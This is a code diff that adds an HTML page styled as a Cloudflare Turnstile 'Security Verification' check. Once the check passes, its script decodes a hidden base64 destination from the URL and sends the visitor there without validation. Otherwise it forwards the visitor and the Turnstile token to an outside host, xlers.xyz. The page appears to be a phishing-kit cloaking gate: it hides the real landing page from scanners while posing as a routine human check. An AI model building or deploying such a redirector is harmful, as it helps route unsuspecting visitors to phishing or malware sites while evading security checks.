@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f1117;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center}
+  .card{background:#1a1d2e;border:1px solid #2d3148;border-radius:16px;padding:48px 40px;max-width:420px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+  .shield{width:64px;height:64px;margin:0 auto 24px;background:linear-gradient(135deg,#3b82f6,#6366f1);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px}
+  h1{font-size:1.4rem;font-weight:700;margin-bottom:8px;color:#f1f5f9}
+  p{font-size:.9rem;color:#94a3b8;margin-bottom:32px;line-height:1.6}
+  .cf-wrap{display:flex;justify-content:center;margin-bottom:24px}
+  .spinner{display:none;width:40px;height:40px;border:3px solid #2d3148;border-top-color:#6366f1;border-radius:50%;animation:spin .8s linear infinite;margin:16px auto}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .footer{margin-top:28px;font-size:.75rem;color:#475569}
+  .footer a{color:#6366f1;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="shield">&#128737;</div>
+  <h1>Security Verification</h1>
+  <p>Please complete the verification below to continue. This helps us confirm you are a human visitor.</p>
+  <div class="cf-wrap">
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAADYRse6i9EFzv0-F" data-callback="onSuccess" data-theme="dark"></div>
+  </div>
+  <div class="spinner" id="spinner"></div>
+  <div class="footer">Protected by <a href="https://cloudflare.com" target="_blank">Cloudflare</a> Turnstile</div>
+</div>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<script>
+function onSuccess(token){
+  document.getElementById('spinner').style.display='block';
+  var p=new URLSearchParams(window.location.search);
+  var t=p.get('t');
+  if(t){
+    try{
+      var dest=atob(t.replace(/-/g,'+').replace(/_/g,'/'));
+      if(dest.startsWith('http://') || dest.startsWith('https://')){
+        setTimeout(function(){window.location.href=dest;},400);
+        return;
+      }
+    }catch(e){}
+  }
+  // fallback — redirect to worker
+  var w=p.get('w');
+  if(w){
+    setTimeout(function(){window.location.href='https://xlers.xyz/r/?t='+w+'&cf-token='+encodeURIComponent(token);},400);
+  }
+}
+</script>
+</body>
+</html>
